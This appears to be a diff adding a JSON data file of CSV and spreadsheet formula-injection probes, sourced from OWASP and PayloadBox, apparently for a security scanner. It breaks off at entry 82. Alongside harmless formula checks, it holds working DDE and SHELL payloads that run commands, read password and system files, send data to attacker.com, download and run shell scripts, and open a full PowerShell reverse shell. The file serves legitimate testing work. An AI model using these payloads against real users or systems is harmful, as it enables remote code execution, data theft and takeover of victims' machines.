@@ -1,0 +1,2054 @@
+[
+  {
+    "id": "csv-injection-owasp-0001",
+    "name": "Equals Formula",
+    "template": "=1+1",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =1+1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0002",
+    "name": "Equals Formula #2",
+    "template": "=1+2+3",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =1+2+3",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0003",
+    "name": "Equals Formula #3",
+    "template": "=SUM(1+1)",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =SUM(1+1)",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0004",
+    "name": "Equals Formula #4",
+    "template": "=2+5+cmd|' /C calc'!A0",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =2+5+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0005",
+    "name": "Equals Formula #5",
+    "template": "=\"string\"",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =\"string\"",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0006",
+    "name": "Equals Formula #6",
+    "template": "=CMD|' /C powershell IEX(wget attacker.com/shell.ps1)'!A0",
+    "description": "Equals Formula probe from OWASP. Tests application handling of: =CMD|' /C powershell IEX(wget ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0007",
+    "name": "Plus Formula",
+    "template": "+1+1",
+    "description": "Plus Formula probe from OWASP. Tests application handling of: +1+1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0008",
+    "name": "Plus Formula #2",
+    "template": "+cmd|'/c calc'!A1",
+    "description": "Plus Formula probe from OWASP. Tests application handling of: +cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0009",
+    "name": "Plus Formula #3",
+    "template": "+DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Plus Formula probe from OWASP. Tests application handling of: +DDE(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0010",
+    "name": "Minus Formula",
+    "template": "-1+1",
+    "description": "Minus Formula probe from OWASP. Tests application handling of: -1+1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0011",
+    "name": "Minus Formula #2",
+    "template": "-cmd|'/c calc'!A1",
+    "description": "Minus Formula probe from OWASP. Tests application handling of: -cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0012",
+    "name": "Minus Formula #3",
+    "template": "-DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Minus Formula probe from OWASP. Tests application handling of: -DDE(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0013",
+    "name": "At Symbol Formula",
+    "template": "@sum(1+1)",
+    "description": "At Symbol Formula probe from OWASP. Tests application handling of: @sum(1+1)",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0014",
+    "name": "At Symbol Formula #2",
+    "template": "@SUM(A1:A10)",
+    "description": "At Symbol Formula probe from OWASP. Tests application handling of: @SUM(A1:A10)",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0015",
+    "name": "Carriage Return",
+    "template": "+=1+1",
+    "description": "Carriage Return probe from OWASP. Tests application handling of: +=1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0016",
+    "name": "Basic DDE - Command Execution",
+    "template": "=DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Basic DDE - Command Execution probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0017",
+    "name": "Basic DDE - Command Execution #2",
+    "template": "=DDE(\"cmd\";\"/c calc.exe\";\"!\")",
+    "description": "Basic DDE - Command Execution probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c calc.exe\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0018",
+    "name": "Basic DDE - Command Execution #3",
+    "template": "=DDE(\"cmd\";\"/c powershell\";\"!\")",
+    "description": "Basic DDE - Command Execution probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c powershell\";\"!\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0019",
+    "name": "Basic DDE - Command Execution #4",
+    "template": "=DDE(\"cmd\";\"/c cmd\";\"!\")",
+    "description": "Basic DDE - Command Execution probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c cmd\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0020",
+    "name": "DDE - File Reading",
+    "template": "=DDE(\"cmd\";\"/c type C:\\Windows\\System32\\drivers\\etc\\hosts\";\"!\")",
+    "description": "DDE - File Reading probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c type C:\\Windows...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0021",
+    "name": "DDE - File Reading #2",
+    "template": "=DDE(\"cmd\";\"/c type C:\\Users\\*\\Desktop\\passwords.txt\";\"!\")",
+    "description": "DDE - File Reading probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c type C:\\Users\\*...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0022",
+    "name": "DDE - File Reading #3",
+    "template": "=DDE(\"cmd\";\"/c dir C:\\\";\"!\")",
+    "description": "DDE - File Reading probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c dir C:\\\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0023",
+    "name": "DDE - Information Disclosure",
+    "template": "=DDE(\"cmd\";\"/c whoami\";\"!\")",
+    "description": "DDE - Information Disclosure probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c whoami\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0024",
+    "name": "DDE - Information Disclosure #2",
+    "template": "=DDE(\"cmd\";\"/c hostname\";\"!\")",
+    "description": "DDE - Information Disclosure probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c hostname\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0025",
+    "name": "DDE - Information Disclosure #3",
+    "template": "=DDE(\"cmd\";\"/c ipconfig\";\"!\")",
+    "description": "DDE - Information Disclosure probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c ipconfig\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0026",
+    "name": "DDE - Information Disclosure #4",
+    "template": "=DDE(\"cmd\";\"/c net user\";\"!\")",
+    "description": "DDE - Information Disclosure probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c net user\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0027",
+    "name": "DDE - Information Disclosure #5",
+    "template": "=DDE(\"cmd\";\"/c systeminfo\";\"!\")",
+    "description": "DDE - Information Disclosure probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c systeminfo\";\"!\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0028",
+    "name": "DDE - Data Exfiltration",
+    "template": "=DDE(\"cmd\";\"/c curl http://attacker.com?data=$(whoami)\";\"!\")",
+    "description": "DDE - Data Exfiltration probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c curl http://att...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0029",
+    "name": "DDE - Data Exfiltration #2",
+    "template": "=DDE(\"cmd\";\"/c powershell -c Invoke-WebRequest -Uri http://attacker.com -Method POST -Body (Get-Content C:\\passwords.txt)\";\"!\")",
+    "description": "DDE - Data Exfiltration probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c powershell -c I...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0030",
+    "name": "DDE - Data Exfiltration #3",
+    "template": "=DDE(\"cmd\";\"/c certutil -urlcache -split -f http://attacker.com/shell.exe C:\\temp\\shell.exe\";\"!\")",
+    "description": "DDE - Data Exfiltration probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c certutil -urlca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0031",
+    "name": "DDE - Reverse Shell",
+    "template": "=DDE(\"cmd\";\"/c powershell -nop -c \\\"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\\\"\";\"!\")",
+    "description": "DDE - Reverse Shell probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c powershell -nop...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0032",
+    "name": "Excel HYPERLINK Function",
+    "template": "=HYPERLINK(\"http://attacker.com\",\"Click here\")",
+    "description": "Excel HYPERLINK Function probe from OWASP. Tests application handling of: =HYPERLINK(\"http://attacker.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0033",
+    "name": "Excel HYPERLINK Function #2",
+    "template": "=HYPERLINK(\"http://attacker.com?cookie=\"&A1,\"Click\")",
+    "description": "Excel HYPERLINK Function probe from OWASP. Tests application handling of: =HYPERLINK(\"http://attacker.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0034",
+    "name": "Excel HYPERLINK Function #3",
+    "template": "=HYPERLINK(\"file:///C:/Windows/System32/calc.exe\",\"Click to update\")",
+    "description": "Excel HYPERLINK Function probe from OWASP. Tests application handling of: =HYPERLINK(\"file:///C:/Windows...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0035",
+    "name": "Excel HYPERLINK Function #4",
+    "template": "=HYPERLINK(CONCATENATE(\"http://attacker.com/\",A1),\"Link\")",
+    "description": "Excel HYPERLINK Function probe from OWASP. Tests application handling of: =HYPERLINK(CONCATENATE(\"http:/...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0036",
+    "name": "IMPORTXML / WEBSERVICE Functions",
+    "template": "=IMPORTXML(\"http://attacker.com/xxe.xml\",\"//data\")",
+    "description": "IMPORTXML / WEBSERVICE Functions probe from OWASP. Tests application handling of: =IMPORTXML(\"http://attacker.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0037",
+    "name": "IMPORTXML / WEBSERVICE Functions #2",
+    "template": "=IMPORTXML(CONCAT(\"http://attacker.com?data=\",A1),\"//data\")",
+    "description": "IMPORTXML / WEBSERVICE Functions probe from OWASP. Tests application handling of: =IMPORTXML(CONCAT(\"http://atta...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0038",
+    "name": "IMPORTXML / WEBSERVICE Functions #3",
+    "template": "=WEBSERVICE(\"http://attacker.com\")",
+    "description": "IMPORTXML / WEBSERVICE Functions probe from OWASP. Tests application handling of: =WEBSERVICE(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0039",
+    "name": "IMPORTXML / WEBSERVICE Functions #4",
+    "template": "=WEBSERVICE(CONCAT(\"http://attacker.com?leak=\",A1))",
+    "description": "IMPORTXML / WEBSERVICE Functions probe from OWASP. Tests application handling of: =WEBSERVICE(CONCAT(\"http://att...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0040",
+    "name": "Using CHAR function to hide commands",
+    "template": "=CHAR(61)&\"DDE(\"\"cmd\"\";\"\"/c calc\"\";\"\"!\"\")\"",
+    "description": "Using CHAR function to hide commands probe from OWASP. Tests application handling of: =CHAR(61)&\"DDE(\"\"cmd\"\";\"\"/c ca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0041",
+    "name": "Using CHAR function to hide commands #2",
+    "template": "=CONCATENATE(CHAR(61),\"1+1\")",
+    "description": "Using CHAR function to hide commands probe from OWASP. Tests application handling of: =CONCATENATE(CHAR(61),\"1+1\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0042",
+    "name": "Using CHAR function to hide commands #3",
+    "template": "=CHAR(61)&CHAR(68)&CHAR(68)&CHAR(69)&\"(\"\"cmd\"\";\"\"/c calc\"\";\"\"!\"\")\"",
+    "description": "Using CHAR function to hide commands probe from OWASP. Tests application handling of: =CHAR(61)&CHAR(68)&CHAR(68)&CH...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0043",
+    "name": "Using string concatenation",
+    "template": "=\"=\"&\"1+1\"",
+    "description": "Using string concatenation probe from OWASP. Tests application handling of: =\"=\"&\"1+1\"",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0044",
+    "name": "Using string concatenation #2",
+    "template": "=CONCATENATE(\"=\",\"1+1\")",
+    "description": "Using string concatenation probe from OWASP. Tests application handling of: =CONCATENATE(\"=\",\"1+1\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0045",
+    "name": "Using string concatenation #3",
+    "template": "=\"=\"&\"DDE(\"\"cmd\"\";\"\"/c calc\"\";\"\"!\"\")\"",
+    "description": "Using string concatenation probe from OWASP. Tests application handling of: =\"=\"&\"DDE(\"\"cmd\"\";\"\"/c calc\"\";...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0046",
+    "name": "Double encoding",
+    "template": "==1+1",
+    "description": "Double encoding probe from OWASP. Tests application handling of: ==1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0047",
+    "name": "Double encoding #2",
+    "template": "=+1+1",
+    "description": "Double encoding probe from OWASP. Tests application handling of: =+1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0048",
+    "name": "Double encoding #3",
+    "template": "=   =1+1",
+    "description": "Double encoding probe from OWASP. Tests application handling of: =   =1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0049",
+    "name": "Null byte injection",
+    "template": "=1+1%00",
+    "description": "Null byte injection probe from OWASP. Tests application handling of: =1+1%00",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0050",
+    "name": "Null byte injection #2",
+    "template": "=DDE(\"cmd\";\"/c calc\";\"!\")%00",
+    "description": "Null byte injection probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c calc\";\"!\")%00",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0051",
+    "name": "Unicode characters",
+    "template": "\uff1d1+1",
+    "description": "Unicode characters probe from OWASP. Tests application handling of: \uff1d1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0052",
+    "name": "Unicode characters #2",
+    "template": "\ufe621+1",
+    "description": "Unicode characters probe from OWASP. Tests application handling of: \ufe621+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0053",
+    "name": "Unicode characters #3",
+    "template": "\u207c1+1",
+    "description": "Unicode characters probe from OWASP. Tests application handling of: \u207c1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0054",
+    "name": "Whitespace obfuscation",
+    "template": "= 1+1",
+    "description": "Whitespace obfuscation probe from OWASP. Tests application handling of: = 1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0055",
+    "name": "Whitespace obfuscation #2",
+    "template": "=  1+1",
+    "description": "Whitespace obfuscation probe from OWASP. Tests application handling of: =  1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0056",
+    "name": "Whitespace obfuscation #3",
+    "template": "=\t1+1",
+    "description": "Whitespace obfuscation probe from OWASP. Tests application handling of: =\t1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0057",
+    "name": "LibreOffice Calc",
+    "template": "=SHELL(\"calc\")",
+    "description": "LibreOffice Calc probe from OWASP. Tests application handling of: =SHELL(\"calc\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0058",
+    "name": "LibreOffice Calc #2",
+    "template": "=SHELL(\"gnome-calculator\")",
+    "description": "LibreOffice Calc probe from OWASP. Tests application handling of: =SHELL(\"gnome-calculator\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0059",
+    "name": "LibreOffice Calc #3",
+    "template": "=SHELL(\"xterm -e bash\")",
+    "description": "LibreOffice Calc probe from OWASP. Tests application handling of: =SHELL(\"xterm -e bash\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0060",
+    "name": "LibreOffice Calc #4",
+    "template": "=SHELL(\"wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh\")",
+    "description": "LibreOffice Calc probe from OWASP. Tests application handling of: =SHELL(\"wget http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0061",
+    "name": "Google Sheets",
+    "template": "=IMAGE(\"http://attacker.com/track.png\")",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMAGE(\"http://attacker.com/tr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0062",
+    "name": "Google Sheets #2",
+    "template": "=IMAGE(\"https://attacker.com/\"&A1)",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMAGE(\"https://attacker.com/\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0063",
+    "name": "Google Sheets #3",
+    "template": "=IMPORTDATA(\"http://attacker.com/data.csv\")",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMPORTDATA(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0064",
+    "name": "Google Sheets #4",
+    "template": "=IMPORTFEED(\"http://attacker.com/feed\")",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMPORTFEED(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0065",
+    "name": "Google Sheets #5",
+    "template": "=IMPORTHTML(\"http://attacker.com\",\"table\",1)",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMPORTHTML(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0066",
+    "name": "Google Sheets #6",
+    "template": "=IMPORTRANGE(\"spreadsheet-id\",\"Sheet1!A1:B10\")",
+    "description": "Google Sheets probe from OWASP. Tests application handling of: =IMPORTRANGE(\"spreadsheet-id\",...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0067",
+    "name": "Chained formulas",
+    "template": "=IF(A1=\"admin\",DDE(\"cmd\";\"/c calc\";\"!\"),\"safe\")",
+    "description": "Chained formulas probe from OWASP. Tests application handling of: =IF(A1=\"admin\",DDE(\"cmd\";\"/c c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0068",
+    "name": "Chained formulas #2",
+    "template": "=IF(ISNUMBER(SEARCH(\"admin\",A1)),WEBSERVICE(\"http://attacker.com\"),\"\")",
+    "description": "Chained formulas probe from OWASP. Tests application handling of: =IF(ISNUMBER(SEARCH(\"admin\",A1...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0069",
+    "name": "Nested functions",
+    "template": "=SUM(DDE(\"cmd\";\"/c calc\";\"!\"))",
+    "description": "Nested functions probe from OWASP. Tests application handling of: =SUM(DDE(\"cmd\";\"/c calc\";\"!\"))",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0070",
+    "name": "Nested functions #2",
+    "template": "=CONCATENATE(DDE(\"cmd\";\"/c whoami\";\"!\"))",
+    "description": "Nested functions probe from OWASP. Tests application handling of: =CONCATENATE(DDE(\"cmd\";\"/c who...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0071",
+    "name": "Conditional execution",
+    "template": "=IF(1=1,DDE(\"cmd\";\"/c calc\";\"!\"),1)",
+    "description": "Conditional execution probe from OWASP. Tests application handling of: =IF(1=1,DDE(\"cmd\";\"/c calc\";\"!...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0072",
+    "name": "Conditional execution #2",
+    "template": "=IFERROR(DDE(\"cmd\";\"/c calc\";\"!\"),1)",
+    "description": "Conditional execution probe from OWASP. Tests application handling of: =IFERROR(DDE(\"cmd\";\"/c calc\";\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0073",
+    "name": "Name field",
+    "template": "@DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Name field probe from OWASP. Tests application handling of: @DDE(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0074",
+    "name": "Email field",
+    "template": "test@test.com=DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Email field probe from OWASP. Tests application handling of: test@test.com=DDE(\"cmd\";\"/c ca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0075",
+    "name": "Email field #2",
+    "template": "=WEBSERVICE(\"http://attacker.com\")@test.com",
+    "description": "Email field probe from OWASP. Tests application handling of: =WEBSERVICE(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0076",
+    "name": "Comment field",
+    "template": "Great product! =DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Comment field probe from OWASP. Tests application handling of: Great product! =DDE(\"cmd\";\"/c ...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0077",
+    "name": "Comment field #2",
+    "template": "Review: +cmd|'/c calc'!A1",
+    "description": "Comment field probe from OWASP. Tests application handling of: Review: +cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0078",
+    "name": "Mixed case",
+    "template": "=dDe(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Mixed case probe from OWASP. Tests application handling of: =dDe(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0079",
+    "name": "Mixed case #2",
+    "template": "=DdE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Mixed case probe from OWASP. Tests application handling of: =DdE(\"cmd\";\"/c calc\";\"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0080",
+    "name": "Alternative quotes",
+    "template": "=DDE('cmd';'/c calc';'!')",
+    "description": "Alternative quotes probe from OWASP. Tests application handling of: =DDE('cmd';'/c calc';'!')",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0081",
+    "name": "Alternative quotes #2",
+    "template": "=DDE(`cmd`;`/c calc`;`!`)",
+    "description": "Alternative quotes probe from OWASP. Tests application handling of: =DDE(`cmd`;`/c calc`;`!`)",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0082",
+    "name": "Line breaks",
